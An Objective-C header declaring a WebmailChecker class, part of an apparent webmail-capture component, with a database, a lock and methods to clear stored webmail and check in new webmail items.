//
//  WebmailChecker.h
//  WebmailCaptureManager
//
//  Created by Makara Khloth on 2/19/15.
//  Copyright (c) 2015 ophat. All rights reserved.
//

#import <Foundation/Foundation.h>

@class FMDatabase;

@interface WebmailChecker : NSObject {
    FMDatabase *mDatabase;
    NSLock *mLocker;
    NSString *mDatabaseFolder;
}

@property (readonly) NSLock *mLocker;

- (id) initWithDatabaseFolder: (NSString *) aDatabaseFolder;

- (void) clearWebmail;
- (BOOL) isWebmailCheckInAndCheckInIfNecessary: (NSDictionary *) aWebmailInfo;

@end
